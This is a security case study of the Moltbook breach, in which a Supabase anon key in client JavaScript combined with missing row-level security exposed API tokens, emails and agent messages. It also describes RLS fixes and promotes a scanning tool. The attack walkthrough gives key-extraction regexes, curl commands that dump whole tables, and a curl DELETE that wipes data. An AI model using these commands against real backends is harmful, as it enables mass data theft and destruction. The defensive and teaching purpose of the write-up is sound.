# Case Study: Moltbook – 1.5 Million API Keys Exposed

> **Summary:** February 2026. Vibe-coded on Lovable + Supabase. Exposed Supabase API key in client JavaScript + missing RLS. 1.5M tokens, 35K email addresses, agent messages leaked.

## What happened

Moltbook was an AI agent collaboration platform built on Lovable and Supabase. In late January and early February 2026, days after launch, Wiz researcher Gal Nagli found the database wide open: 1.5 million API authentication tokens, 35,000 user email addresses, and roughly 4,060 private agent direct messages. All queryable with a single curl request.

The app was only days old when Wiz found it, which is its own lesson — a brand-new launch can be wide open from minute one. Wiz notified Moltbook, who patched in about 3.5 hours. Good response time. It doesn't undo the window, and a fast scanner pointed at a fresh launch doesn't need months.

## Root cause

Two things, both required to cause the breach, both fixable in under an hour.

First: the Supabase anon key was hardcoded directly in `app/lib/supabase.ts`, which Lovable bundled into the production JavaScript. Anyone could open DevTools, search for `eyJ`, and have the key in seconds. This part is actually less bad than it sounds. The anon key is designed to be public. The problem is what came next.

Second: the `api_tokens` and `conversations` tables had no RLS policies. With no policies, the anon key could query every row in every table. Not just the authenticated user's rows. All of them:

```sql
-- NO RLS: anyone can run this
SELECT * FROM api_tokens;
SELECT * FROM conversations;
SELECT * FROM users WHERE email LIKE '%@%';
```

Either mistake alone would have been survivable. The anon key in client JS with proper RLS is fine. That's how Supabase is meant to work. RLS missing but key server-side only would also have been fine. Both missing at once is how you lose 1.5 million tokens.

## Anatomy of the attack

1. **Attacker finds Moltbook via product hunt or domain enumeration**
 - Visits `moltbook.io` in a browser

2. **Attacker opens DevTools (F12) and inspects JavaScript bundles**
 - Finds `main.{hash}.js` which contains the bundled Supabase client
 - Extracts the anon_key via string search or regex: `Bearer eyJ[A-Za-z0-9_-]+`

3. **Attacker extracts the Supabase project URL** from the client initialization
 ```
 Project URL: https://moltbook.supabase.co
 Anon Key: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImV4YW1wbGUiLCJyb2xlIjoiYW5vbiJ9...
 ```

4. **Attacker queries the database using the Supabase REST API**
 ```bash
 curl -s 'https://moltbook.supabase.co/rest/v1/api_tokens?limit=100000' \
 -H "Authorization: Bearer eyJhbGc..." \
 -H "Content-Type: application/json" \
 -o tokens.json
 
 # Response: 1.5 million API tokens with associated user IDs
 ```

5. **Attacker pivots to the users table**
 ```bash
 curl -s 'https://moltbook.supabase.co/rest/v1/users' \
 -H "Authorization: Bearer eyJhbGc..." \
 | jq '.[] | {id, email, created_at}' > users.json
 
 # Dumps 35,000 user records
 ```

6. **Attacker exports conversation history**
 ```bash
 curl -s 'https://moltbook.supabase.co/rest/v1/conversations?limit=500000' \
 -H "Authorization: Bearer eyJhbGc..." \
 > conversations.json
 
 # ~4,060 private agent DMs, some with API keys in conversation context
 ```

7. **Attacker optionally inserts malicious data or deletes tables** (if UPDATE/DELETE is also enabled)
 ```bash
 curl -X DELETE 'https://moltbook.supabase.co/rest/v1/conversations' \
 -H "Authorization: Bearer eyJhbGc..."
 
 # Deletes all conversations (availability impact)
 ```

## How PreLaunch Vault catches this

- **`skills/secrets/find-exposed-env-vars.md`**. Detects Supabase anon_key hardcoded in JavaScript bundles. Would flag the exact line number and recommend moving to `.env.local` or environment-injected values.

- **`skills/auth/audit-supabase-rls.md`**. Scans SQL migrations and schema. If RLS is missing on `api_tokens`, `conversations`, or `users` tables, it flags all three.

- **`skills/secrets/audit-client-server-boundary.md`**. Identifies which secrets are leaking across the client-server boundary. API tokens should never be accessible from the frontend.

- **`skills/api/audit-file-upload-security.md`**. If the app used file uploads, this would catch the misconfiguration allowing unauthenticated uploads via the anon_key.

- **`skills/auth/detect-idor.md`**. Would spot that the conversations table lacks user ID isolation (no `WHERE user_id = auth.uid()` filter).

## The fix (what to do today)

### 1. Rotate all exposed API tokens

If your app had this vulnerability, assume all tokens were compromised:

```bash
# For Moltbook specifically:
# - Regenerate all API keys in Settings > API Keys
# - Notify users of potential compromise
# - Audit logs for unauthorized token usage
```

### 2. Move the Supabase anon_key to environment variables

**Before (vulnerable):**
```javascript
export const supabase = createClient(
 "https://project.supabase.co",
 "eyJ..." // hardcoded
);
```

**After (safe):**
```javascript
// .env.local (NEVER commit)
NEXT_PUBLIC_SUPABASE_URL=https://project.supabase.co
NEXT_PUBLIC_SUPABASE_ANON_KEY=eyJ...

// app/lib/supabase.ts
export const supabase = createClient(
 process.env.NEXT_PUBLIC_SUPABASE_URL!,
 process.env.NEXT_PUBLIC_SUPABASE_ANON_KEY!
);
```

### 3. Enable RLS on all tables

```sql
-- For api_tokens table
ALTER TABLE api_tokens ENABLE ROW LEVEL SECURITY;

CREATE POLICY "Users can only see their own tokens"
 ON api_tokens
 FOR SELECT
 USING (auth.uid() = user_id);

CREATE POLICY "Users can only modify their own tokens"
 ON api_tokens
 FOR UPDATE
 USING (auth.uid() = user_id);

-- Repeat for conversations, users, and all other tables
```

### 4. Audit all tables for RLS compliance

```bash
# Connect to your Supabase database
psql postgresql://...

# Check RLS status on all tables
SELECT tablename, rowsecurity FROM pg_tables WHERE schemaname='public';

# Check that policies exist
SELECT tablename, policyname, cmd FROM pg_policies WHERE schemaname='public';

# If any table lacks policies, enable RLS immediately
```

### 5. Test with the anon_key locally

```javascript
// During development, ONLY use the anon_key
const testClient = createClient(
 process.env.NEXT_PUBLIC_SUPABASE_URL,
 process.env.NEXT_PUBLIC_SUPABASE_ANON_KEY // NOT the service key
);

// If your app fails, RLS is preventing unauthorized access (correct behavior)
// Fix the RLS policy, not the test
```

## Lessons

If you store other people's API keys. OpenAI, Stripe, Anthropic, anything. Those rows need per-user RLS, full stop. An `api_tokens` table with no policies is not a database, it's a gift basket for whoever finds it first.

The missing detection is the part worth sitting with. Moltbook had no monitoring that flagged bulk reads across their `api_tokens` table. A single query returning 1.5 million rows is not normal application behavior. Whether a database is exposed for eight months or eight hours, if you have no alerting on query volume or row counts, you won't know when you're being exfiltrated — and an attacker scanning fresh launches doesn't need months.

The anon key in client JS is not the lesson here. That's fine. Use environment variables anyway, but the anon key is public by design. The lesson is that RLS is not an advanced feature you add later. It's the thing that makes Supabase's entire public-key model safe to use. Without it, you've built a database with a sign on the front that says "please take what you need."

## Sources

- https://www.wiz.io/blog/exposed-moltbook-database-reveals-millions-of-api-keys
- Wiz security advisory (Feb 2026)
